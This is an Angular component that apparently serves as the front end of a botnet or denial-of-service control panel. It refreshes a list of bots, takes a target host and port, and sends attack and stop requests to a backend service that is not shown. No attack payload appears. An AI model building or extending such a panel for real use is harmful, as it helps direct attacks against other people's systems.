import { Component, OnDestroy, OnInit } from '@angular/core';
import { catchError, interval, map, of, Subject, switchMap, takeUntil, tap, timeout } from 'rxjs';
import { AppService, BotInfo } from './app.service';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.less'],
})
export class AppComponent implements OnInit, OnDestroy {
  botList: BotInfo[] = [];
  host: string = '';
  port: number = 0;
  
  private destroyed$ = new Subject<void>();

  constructor(private appService: AppService) { }
  

  ngOnInit(): void {
    this.refreshList();
    interval(5000).pipe(takeUntil(this.destroyed$)).subscribe(() => this.refreshList());
  }

  ngOnDestroy(): void {
    this.destroyed$.next();
    this.destroyed$.complete();
  }

  attack() {
    this.appService.attack({host: this.host, port: this.port}).pipe(takeUntil(this.destroyed$)).subscribe();
  }

  stop() {
    this.appService.stop().pipe(takeUntil(this.destroyed$)).subscribe();
  }

  private refreshList() {
    this.appService.getBots().pipe(
      takeUntil(this.destroyed$)
    ).subscribe(list => {
      this.botList = list;
    });
  }
}
